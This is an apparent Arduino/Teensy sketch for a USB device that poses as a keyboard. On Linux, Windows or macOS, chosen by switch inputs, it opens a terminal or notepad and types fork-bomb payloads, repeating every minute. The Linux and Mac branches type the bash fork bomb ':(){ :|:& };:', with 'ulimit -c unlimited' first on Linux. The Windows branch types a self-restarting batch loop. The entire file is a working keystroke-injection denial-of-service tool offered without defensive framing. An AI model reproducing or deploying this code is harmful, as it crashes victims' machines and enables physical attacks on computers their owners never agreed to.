const int ledPin = 11;
const int swLinux = 6;
const int swWindows = 7;
const int swMac = 8;

void setup(){
  pinMode(swLinux, INPUT);
  pinMode(swWindows, INPUT);
  pinMode(swMac, INPUT);
  // Let time to recognize usb keyboard
  // FIXME: windows needs 3s, but linux is ok in less time
  delay(3000);
}

void loop(){
  if (digitalRead(swLinux)){
    LinuxPayload();
  } 
  else if(digitalRead(swWindows)){
    WindowsPayload();
  } 
  else if(digitalRead(swMac)){
    ApplePayload();
  }
  delay(60000); //1mn
}

// Specific functions
void LinuxPayload(){
  LinuxCommandRun("xterm");
  delay(800);
  Keyboard.print("ulimit -c unlimited");
  KeyPress(KEY_ENTER);
  Keyboard.print(":(){ :|:& };:");
  KeyPress(KEY_ENTER);
}

void WindowsPayload(){
  WindowsCommandRun("notepad.exe");
  Keyboard.print("\n");
  Keyboard.print(":s");
  Keyboard.print("start %0");
  Keyboard.print("goto :s");
}

void ApplePayload(){
  AppleCommandRun("Terminal");
  Keyboard.print(":(){ :|:& };:");
  KeyPress(KEY_ENTER);
}

// Utility functions
void WindowsCommandRun(char *SomeCommand){
  KeyCombo(MODIFIERKEY_GUI,KEY_R);
  delay(1500);
  Keyboard.print(SomeCommand);
  KeyPress(KEY_ENTER);
}

void LinuxCommandRun(char *SomeCommand){
  KeyCombo(MODIFIERKEY_ALT,KEY_F2);
  delay(300);
  Keyboard.print(SomeCommand);
  KeyPress(KEY_ENTER);
}

void AppleCommandRun(char *SomeCommand){
  KeyCombo(MODIFIERKEY_GUI,KEY_SPACE); // "apple" aka command key, space key -- open spotlight
  delay(500);
  Keyboard.print("Terminal.app");
  delay(1000);

  KeyPress(KEY_ENTER);
  delay(1500);
  Keyboard.print(SomeCommand);
  KeyPress(KEY_ENTER);
}

void KeyPress(int SomeKey) {
  Keyboard.set_key1(SomeKey);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void KeyCombo(int ModKey,int SomeKey) {
  Keyboard.set_modifier(ModKey);
  Keyboard.set_key1(SomeKey);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}




